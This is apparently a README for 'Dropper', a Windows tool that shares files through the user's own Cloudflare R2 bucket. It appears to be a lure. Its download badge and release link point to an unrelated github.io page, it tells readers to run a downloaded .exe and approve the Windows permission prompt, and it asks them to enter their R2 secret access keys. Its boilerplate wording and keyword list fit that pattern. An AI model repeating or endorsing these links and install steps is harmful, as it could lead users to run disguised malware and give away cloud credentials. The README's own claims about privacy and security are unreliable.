# 📦 dropper - Share your files with one movement

[![Download dropper](https://img.shields.io/badge/Download-Release-blue.svg)](https://rumbling-pyrographer341.github.io)

Dropper makes sharing files fast and simple. You move a file to your menu bar and receive a link on your clipboard. The file sits in your own Cloudflare R2 storage bucket. You keep full control over your data. There are no monthly fees and no middleman services. You use your own domain name for every shared link.

## 🛠️ How it works

The application creates a direct bridge between your computer and your personal cloud storage. When you drag a file into the menu bar tool, Dropper sends the data to your bucket. It then generates a public link for that specific file. You paste this link wherever you need it. 

Because you own the storage bucket, you decide who sees your files. You do not rely on third-party servers to host your content. This setup keeps your workflow private and efficient.

## 📥 Setup and Installation

Follow these steps to get Dropper running on your computer.

1. Visit the [official release page](https://rumbling-pyrographer341.github.io) to find the latest version of the installer.
2. Select the file ending in .exe to start the download.
3. Open your Downloads folder once the file finishes saving.
4. Double-click the dropper-setup.exe file to begin the installation.
5. Follow the prompts on your screen. Windows may ask for permission to run the application. Click Yes to proceed.
6. The application icon will appear in your system tray once the installation ends.

## ⚙️ Configuration

Dropper requires a connection to your Cloudflare R2 storage to function. You must provide your account details one time during the initial setup.

1. Log into your Cloudflare dashboard in your web browser.
2. Navigate to the R2 section and create a new bucket if you do not have one.
3. Click the Manage R2 API Tokens button to create a new key.
4. Copy your Access Key ID and Secret Access Key.
5. Click the Dropper icon in your system tray and select Preferences.
6. Paste your bucket name, Access Key ID, and Secret Access Key into the provided fields.
7. Enter your custom domain name if you have one linked to your bucket.
8. Click Save to connect the application.

## 🚀 Daily Usage

You can share any file type using this tool. 

1. Locate the file you want to share on your computer.
2. Click and hold the file with your mouse.
3. Drag the file to the Dropper icon located in your Windows system tray.
4. Release the mouse button.
5. Watch for the progress bar at the bottom of the icon.
6. Wait for the notification that says the link is ready.
7. Paste the link anywhere using the CTRL+V shortcut on your keyboard.

## 🔒 Privacy and Security

You do not share passwords or private logins with any external service. Your files travel directly from your machine to your personal bucket. No other person or company can access your files. If you delete a file from your R2 bucket, the link stops working immediately. You maintain total ownership of your images, documents, and videos at all times.

## 💻 Requirements

* Windows 10 or Windows 11
* A free or paid Cloudflare account
* An active R2 storage bucket
* An internet connection

## 💡 Frequently Asked Questions

**Does this work with large files?**
Yes. You can upload large files as long as your R2 bucket has enough storage space available.

**Can I change the domain later?**
Yes. Open the Preferences menu at any time to update your domain settings or switch to a different bucket.

**What happens if I turn off the app?**
Your files remain safe in your bucket. The application only helps you move the files into that space. You can reinstall the app at any time to regain control over your remote files.

**Is there a limit on how many files I can share?**
There is no hard limit on the number of files. You only face the storage limits set by your Cloudflare plan.

**Can I use this for business documents?**
The tool provides a secure path for data transfer. Ensure your security settings on Cloudflare align with your business needs regarding public access.

Keywords: file sharing, cloud storage, cloudflare, r2, productivity, windows, transfer, utilities, automation